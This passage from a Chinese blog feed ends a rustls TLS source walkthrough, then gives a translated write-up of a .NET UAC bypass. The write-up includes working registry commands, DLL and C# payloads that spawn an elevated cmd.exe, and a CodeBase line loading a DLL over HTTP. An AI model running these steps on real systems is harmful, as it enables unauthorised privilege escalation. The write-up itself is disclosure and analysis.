state</span><br><span class="line">        .check_message(&amp;msg)</span><br><span class="line">        .map_err(|err| &#123;</span><br><span class="line">            self.queue_unexpected_alert();</span><br><span class="line">            err</span><br><span class="line">        &#125;)?;</span><br><span class="line">    //处理本次数据，返回下次需要处理的数据对象</span><br><span class="line">    self.state = Some(state.handle(self, msg)?);</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>消息处理调用流程如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//ClientSessionImpl</span><br><span class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</span><br></pre></td></tr></table></figure> <p>下面直接列出client端握手处理流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ExpectServerHelloOrHelloRetryRequest:handle </span><br><span class="line">ExpectServerHello:handle // 处理serverhello</span><br><span class="line">ExpectTLS12Certificate: handle //验证证书</span><br><span class="line">ExpectTLS12ServerKX: handle  // 密钥交换</span><br><span class="line">ExpectTLS12ServerDoneOrCertReq: handle</span><br><span class="line">ExpectTLS12ServerDone: handle</span><br><span class="line">emit_clientkx</span><br><span class="line">emit_ccs</span><br><span class="line">ExpectTLS12CCS:handle //通知使用加密方式发送报文，sess.common.peer_now_encrypting();设置后面数据会加密的状态</span><br><span class="line">emit_finished</span><br><span class="line">ExpectTLS12Finished:handle // 握手结束</span><br></pre></td></tr></table></figure> <p>在<code>ExpectTLS12Finished::handle</code>中，会保存<code>session</code>，开始传输数据，以及返回下次的<code>state</code>，<strong>此时握手协议已经完成</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">save_session(&amp;mut st.handshake,</span><br><span class="line">             &amp;mut st.ticket,</span><br><span class="line">             sess);</span><br><span class="line"></span><br><span class="line">if st.resuming &#123;</span><br><span class="line">    emit_ccs(sess);</span><br><span class="line">    emit_finished(&amp;mut st.handshake, sess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sess.common.we_now_encrypting();</span><br><span class="line">sess.common.start_traffic(); //发送数据</span><br><span class="line">Ok(st.into_expect_tls12_traffic(fin)) // 下次需要ExpectTLS12Traffic</span><br></pre></td></tr></table></figure> <p>后面数据传输的所有流程都会进入<code>ExpectTLS12Traffic::handle</code>，也就是开始<strong>传输协议</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">impl State for ExpectTLS12Traffic &#123;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ClientSessionImpl, mut m: Message) -&gt; StateResult &#123;</span><br><span class="line">   sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</span><br><span class="line">        Ok(self) //返回的依然是ExpectTLS12Traffic给state，所以以后都会进入这里</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>传输数据的处理</strong>。</p> <p><strong>接收数据</strong></p> <p>调用<code>take_received_plaintext</code>将获取到的明文Message传给内部处理，存入<code>SessionCommon</code>的<code>received_plaintext</code>，等待用户的提取。</p> <p>那明文Message是怎么来的呢？是在前面说到的消息处理流程中，到handle之前。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</span><br></pre></td></tr></table></figure> <p>在<code>process_msg</code>中会判断<code>peer_encrypting</code>状态为真则将数据解密，而该状态是在握手中<code>ExpectTLS12CCS::handle</code> 被设置为true的。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pub fn process_msg(&amp;mut self, mut msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</span><br><span class="line"> // Decrypt if demanded by current state.</span><br><span class="line"> if self.common.peer_encrypting &#123;</span><br><span class="line">     let dm = self.common.decrypt_incoming(msg)?; //解密数据</span><br><span class="line">     msg = dm;</span><br><span class="line"> &#125;</span><br><span class="line">        </span><br><span class="line">//self.common.peer_encrypting</span><br><span class="line">pub fn peer_now_encrypting(&amp;mut self) &#123;</span><br><span class="line">    self.peer_encrypting = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>发送数据</strong></p> <p><strong>握手过程中</strong>，发送数据包使用<code>sess.common.send_msg(ch, false)</code>。<code>send_msg</code>内部根据是否加密状态（<code>must_encrypt</code>）进行不同处理，直接缓存或者调用<code>send_msg_encrypt</code>加密之后缓存。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_msg_encrypt-&gt;send_single_fragment-&gt;encrypt_outgoing(加密)</span><br></pre></td></tr></table></figure> <p>最后都是通过<code>queue_tls_message</code>将数据先缓存，然后在调用<code>write_tls</code>之后将数据发送。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pub fn write_tls(&amp;mut self, wr: &amp;mut Write) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    self.sendable_tls.write_to(wr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>握手完成后</strong>，通过<code>ClientSession</code>实现的<code>io::write</code>（或者<code>write_all</code>）接口发送明文数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impl io::Write for ClientSession &#123;</span><br><span class="line"> //先缓存数据</span><br><span class="line">    fn write(&amp;mut self, buf: &amp;[u8]) -&gt; io::Result&lt;usize&gt;&#123;</span><br><span class="line">            self.imp.common.send_some_plaintext(buf)</span><br><span class="line">    &#125;</span><br><span class="line"> //flush时才发送数据</span><br><span class="line">    fn flush(&amp;mut self) -&gt; io::Result&lt;()&gt; &#123;</span><br><span class="line">        self.imp.common.flush_plaintext();</span><br><span class="line">        Ok(())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><code>send_some_plaintext</code>在根据是否握手完成有不同的操作，握手未完成时，先缓存明文到<code>sendable_plaintext</code>，握手完成后，直接调用<code>send_appdata_encrypt</code>缓存密文（进入<code>send_single_fragment</code>过程加密）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pub fn send_some_plaintext(&amp;mut self, data: &amp;[u8]) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    self.send_plain(data, Limit::Yes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn send_plain(&amp;mut self, data: &amp;[u8], limit: Limit) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    if !self.traffic &#123; //握手未完成</span><br><span class="line">        let len = match limit &#123; //缓存明文</span><br><span class="line">            Limit::Yes =&gt; self.sendable_plaintext.append_limited_copy(data),</span><br><span class="line">            Limit::No =&gt; self.sendable_plaintext.append(data.to_vec())</span><br><span class="line">        &#125;;</span><br><span class="line">        return Ok(len);</span><br><span class="line">    &#125;</span><br><span class="line">    //握手完成，直接缓存加密数据</span><br><span class="line">    Ok(self.send_appdata_encrypt(data, limit))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>握手完成时，之前缓存的明文数据通过<code>start_traffic</code>实际将数据加密缓存到sendable_tls，最后也是通过write_tls发送出去。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pub fn start_traffic(&amp;mut self) &#123;</span><br><span class="line">        self.traffic = true;</span><br><span class="line">        self.flush_plaintext();</span><br><span class="line">    &#125;</span><br><span class="line">-&gt;</span><br><span class="line">flush_plaintext-&gt;send_plain-&gt;send_appdata_encrypt-&gt;send_single_fragment-&gt; encrypt_outgoing(加密)</span><br></pre></td></tr></table></figure> <p>握手完成之后调用的<code>send_some_plaintext</code>是直接将数据加密缓存，在write_tls后发送出去。</p> <h3 id="server详解"><a href="#server详解" class="headerlink" title="server详解"></a>server详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src/server/mod.rs 导出ServerSession接口，外部使用</span><br><span class="line">src/server/hs.rs tls协议中所有包处理，包括握手和传输</span><br><span class="line">src/client/</span><br></pre></td></tr></table></figure> <p>公开外部使用的借口ServerSession，内部由ServerSessionImpl实现。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pub struct ServerSessionImpl &#123;</span><br><span class="line">    pub config: Arc&lt;ServerConfig&gt;, //证书、密钥等配置</span><br><span class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //会话密钥</span><br><span class="line">    pub common: SessionCommon, // 实际握手传输数据处理对象</span><br><span class="line">    sni: Option&lt;webpki::DNSName&gt;, //SNI(Server Name Indication) ，解决一个服务器使用多个域名和证书的SSL/TLS扩展</span><br><span class="line">    pub alpn_protocol: Option&lt;String&gt;,</span><br><span class="line">    pub error: Option&lt;TLSError&gt;,</span><br><span class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, //握手和传输中处理数据包的状态，每个状态的数据包处理对象</span><br><span class="line">    pub client_cert_chain: Option&lt;Vec&lt;key::Certificate&gt;&gt;, //client证书链</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>接口基本和ClientSession类似，不再详述</strong></p> <p><strong>握手流程</strong></p> <p>server和client处理握手的方式都一样，每个握手包处理对象都会实现State接口。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub trait State &#123;</span><br><span class="line">    fn check_message(&amp;self, m: &amp;Message) -&gt; CheckResult;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, m: Message) -&gt; StateResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>然后在收到client消息之后，在<code>process_main_protocol</code>中调用对应握手包对象的handle函数，并且会返回握手期望处理的下次数据包对象给state，以便下次收到消息继续处理。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//process_main_protocol</span><br><span class="line">self.state = Some(st.handle(self, msg)?);</span><br></pre></td></tr></table></figure> <p>握手流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----ExpectClientHello::handle</span><br><span class="line">-----ExpectTLS12Certificate::handle //如果需要验证client的证书，有这步</span><br><span class="line">-----ExpectTLS12ClientKX::handle //密钥交换</span><br><span class="line">-----ExpectTLS12CertificateVerify::handle //验证client证书</span><br><span class="line">-----ExpectTLS12CCS::handle //通知使用加密方式发送报文</span><br><span class="line">-----ExpectTLS12Finished::handle //握手完成</span><br><span class="line">-----ExpectTLS12Traffic:: handle //开发传输数据</span><br></pre></td></tr></table></figure> <p><strong>消息传输</strong></p> <p>同样，握手完成后，server在<code>ExpectTLS12Traffic::handle</code>中处理后续的传输协议中的消息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">impl State for ExpectTLS12Traffic &#123;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, mut m: Message) -&gt; StateResult &#123;</span><br><span class="line">        println!(&quot;-----ExpectTLS12Traffic::handle&quot;);</span><br><span class="line">        sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</span><br><span class="line">        Ok(self)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>数据加密和解密流程基本和client类似，不再详述。</p> <p><strong>另外，client和server握手中需要发送的数据包构造都在hs.rs::emit_xxx函数中</strong></p> <h3 id="消息相关"><a href="#消息相关" class="headerlink" title="消息相关"></a>消息相关</h3><p>该部分存在单独的msgs目录下，包含了握手过程中各种消息类型的定义，消息传输具体设计的<code>fragment/deframe</code>等。</p> <p>所有消息统一的结构<code>Message</code>，<code>Message</code>也定义了一下方便获取字段和数据的借口，这里不再详述。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pub struct Message &#123;</span><br><span class="line">    pub typ: ContentType,</span><br><span class="line">    pub version: ProtocolVersion,</span><br><span class="line">    pub payload: MessagePayload,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//msgs/message.rs</span><br><span class="line">MessagePayload</span><br><span class="line">BorrowMessage</span><br><span class="line"></span><br><span class="line">//msgs/handshake.rs</span><br><span class="line">包含握手过程中，证书、密钥交换的一些数据结构</span><br><span class="line"></span><br><span class="line">//msgs/deframe.rs</span><br><span class="line">定义了MessageDeframer，管理Message数据，read/deframe_one</span><br><span class="line"></span><br><span class="line">//msgs/hsjoiner.rs</span><br><span class="line">HandshakeJoiner，重建握手数据，验证数据等定义</span><br><span class="line"></span><br><span class="line">//msgs/enums.rs</span><br><span class="line">各种版本号，算法类型号，握手包类型序号等等的enum定义</span><br><span class="line"></span><br><span class="line">//msgs/ccs.rs</span><br><span class="line">密钥交换相关定义</span><br></pre></td></tr></table></figure> <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table> <thead> <tr> <th>文件</th> <th>说明</th> </tr> </thead> <tbody> <tr> <td>key.rs</td> <td>密钥、证书结构定义</td> </tr> <tr> <td>pemfile.rs</td> <td>PEM文件解析生成密钥相关接口</td> </tr> <tr> <td>verify.rs</td> <td>证书验证相关</td> </tr> <tr> <td>suites.rs</td> <td>加密套件、密钥交换相关</td> </tr> <tr> <td>sign.rs</td> <td>签名相关</td> </tr> <tr> <td>vecbuf.rs</td> <td>所有消息数据最底层存储结构，vec构成</td> </tr> <tr> <td>webpki</td> <td>三方库，完成证书验证</td> </tr> <tr> <td>ring</td> <td>三方库，完成加密算法相关能力</td> </tr> </tbody> </table> <p><strong>下篇在根据示例代码分析一下rustls库具体的使用</strong></p> <p>转载请注明出处：<a href="https://anhkgg.github.io/rustls-source-code-analyze/">https://anhkgg.github.io/rustls-source-code-analyze/</a></p> ]]></content>          <summary type="html">            &lt;ul&gt; &lt;li&gt;作者：&lt;strong&gt;anhkgg&lt;/strong&gt; &lt;/li&gt; &lt;li&gt;日期：&lt;strong&gt;2017-11-16&lt;/strong&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。&lt;/p&gt; &lt;p&gt;主要分析的源码内容：&lt;/p&gt; &lt;ol&gt; &lt;li&gt;client和server的握手协议流程&lt;/li&gt; &lt;li&gt;rustls是如何进行数据传输的&lt;/li&gt; &lt;li&gt;数据传输是如何加密解密的&lt;/li&gt; &lt;/ol&gt;          </summary>            <category term="rust" scheme="https://anhkgg.github.io/categories/rust/"/>                 <category term="rust" scheme="https://anhkgg.github.io/tags/rust/"/>            <category term="rustls" scheme="https://anhkgg.github.io/tags/rustls/"/>            <category term="源码分析" scheme="https://anhkgg.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>            <category term="TLS/SSL" scheme="https://anhkgg.github.io/tags/TLS-SSL/"/>        </entry>      <entry>     <title>翻译：通过.NET程序提权绕过UAC</title>     <link href="https://anhkgg.github.io/tans-net-bypass-uac/"/>     <id>https://anhkgg.github.io/tans-net-bypass-uac/</id>     <published>2017-09-21T06:04:46.000Z</published>     <updated>2017-09-21T06:08:51.861Z</updated>          <content type="html"><![CDATA[<p>.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。</p> <a id="more"></a> <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去年五月， Casey Smith在他的博客和Twitter上指出.NET分析器的DLL加载可能会被滥用，通过环境变量使合法的.NET程序加载一个恶意DLL</p> <p>当看到这一点，脑海中第一种想法就是，如果这个方法在高权限.NET进程也可以工作，那这将是一个绕过UAC的好办法。果然，确实如此。</p> <p>这个问题到写这篇博客时依然没有修复，而且可能一直如此——但是在7月，它被 Stefan Kanthak独立地发现并报告了，按完整披露流程公布了该问题。</p> <h1 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h1><p>要让一个.NET应用程序加载任意一个DLL，我们可以使用以下环境变量。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;GUID&#125;</span><br><span class="line">COR_PROFILER_PATH=C:\path\to\some.dll</span><br></pre></td></tr></table></figure> <p>在.NET 4以下版本，CLSID必须在HKCR\CLSID{GUID}\InprocServer32定义包含profiling DLL的路径的注册表键。在最近版本中，CLR通过COR_PROFILER_PATH环境变量来找这个DLL，如果COR_PROFILER_PATH没有定义再使用CLSID查找。</p> <p>HKCR\CLSID是HKLM和HKCU下Software\Classes\CLSID组合起来显示的。在HKLM（或者系统环境变量）下创建CLSID键需要提权，而在HKCU下创建不需要。需要注意，在用户环境变量和HKCU注册表项下一切也都工作正常。</p> <p>可以简单使用一段批处理命令让它工作：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure> <p>这些命令在低权限命令行下可以在高权限的mmc.exe进程中加载C:\temp\test.dll(如果存在)。可以绕过Windows 7到10（包括最新RS3）系统的默认UAC设置。</p> <p><img src="/img/net-bypass-uac-1.png" alt="net-bypass-uac-1.png"></p> <p><a href="https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9" target="_blank" rel="noopener">内嵌DLL的powershell POC可以在这里找到（只支持X64）。</a></p> <p>这个DLL只在DLL_PROCESS_ATTACH下运行一个cmd.exe，会产生一个提权的命令行终端，然后马上退出当前进程，阻止MMC控制台弹出。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] = &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>在Windows 7,8.1，10 1703和10 RS3 build 16275中测试通过。<br>当然，如果你有可访问的SMB共享，UNC路径也可以工作。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COR_PROFILER_PATH=\\server\share\test.dll</span><br></pre></td></tr></table></figure> <h1 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h1><p>COM运行时在运行高权限进程时会阻止在HKCU查找CLSID，所以这种绕过方式无效，但是.NET运行时没有阻止，在这种情况下，.NET在shim组件查找时会查找这些键值。</p> <p><img src="/img/net-bypass-uac-2.png" alt="net-bypass-uac-2.png"></p> <p>如果要修复，需要CLR实现和COM一样的检查。</p> <h1 id="更多维度"><a href="#更多维度" class="headerlink" title="更多维度"></a>更多维度</h1><p>现在我们知道CLR是如何工作的了，我们可以在堆栈中找他CLR调用的其他在HKCU查找CLSID的实例。一个实例是GPEdit（Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager）组件（在我测试虚拟机中CLSID是{B29D466A-857D-35BA-8712-A758861BFEA1}）。</p> <p><img src="/img/net-bypass-uac-3.png" alt="net-bypass-uac-3.png"></p> <p>查看HKCU已经存在的项中，好像是指向CLR程序及自己实现的组件。</p> <p><img src="/img/net-bypass-uac-4.png" alt="net-bypass-uac-4.png"></p> <p>我们可以在HKCU下像这样定义一个COM项（.reg格式）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;]</span><br><span class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45E7-B440-6E39B2CDBF29&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32\10.0.0.0]</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\ProgId]</span><br><span class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</span><br></pre></td></tr></table></figure></p> <p>MMC会加载我们的托管DLL，并且尝试访问TestDotNet.Class1类。C#没有一种简单的创建入口是DllMain的简单DLL（我们很懒所以不想写模块初始化），但是貌似注册表指向的类被加载了，所以我们只需要一个静态构造函数来执行我们的提权代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace TestDotNet</span><br><span class="line">&#123;</span><br><span class="line">   public class Class1</span><br><span class="line">   &#123;</span><br><span class="line">      static Class1()</span><br><span class="line">      &#123; </span><br><span class="line">         Process.Start(&quot;cmd.exe&quot;);</span><br><span class="line">         Environment.Exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p> <p>将DLL放在注册表项定义的位置，然后运行gpedit.msc，可以看到弹出了一个提权的终端（和.NET一样）。</p> <p><img src="/img/net-bypass-uac-5.png" alt="net-bypass-uac-5.png"></p> <p><img src="/img/net-bypass-uac-6.png" alt="net-bypass-uac-6.png"></p> <p>这种方式一个有趣的点是CodeBase不仅限于本地文件和SMB共享，这个DLL还可以从HTTP链接中加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;CodeBase&quot;=&quot;http://server:8080/test_managed.dll&quot;</span><br></pre></td></tr></table></figure></p> <p>需要注意的是下载的DLL会拷贝到硬盘上，所以这种方式比本地DLL更好检测（硬盘+网络组合）。</p> <p>另外一件好事（对攻击者）是这种方式下可以滥用多种CLSID。<br>下面是在compmgmt.msc，event、vwr.msc,secpol.msc和taskschd.msc可使用CLSID：</p> <ol> 